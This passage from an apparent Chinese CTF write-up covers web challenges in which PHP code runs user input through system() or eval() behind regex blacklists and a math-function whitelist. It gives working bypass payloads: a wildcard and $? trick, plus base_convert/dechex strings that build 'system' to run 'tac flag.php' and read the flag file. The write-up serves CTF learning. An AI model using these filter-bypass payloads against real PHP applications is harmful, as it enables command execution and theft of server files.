    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>

```



> 通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误

官方wp给的payload

```
code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
```

反复刷新就出来了

![image-20220713123941038](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131239105.png?x-oss-process=hzy)

# web124

题目如下

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

```
?c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1}) 
添加头部信息：1=tac flag.php
```

```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&abs=system&acos=tac flag.php
```

这俩都行

![image-20220713124248743](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131242827.png?x-oss-process=hzy)
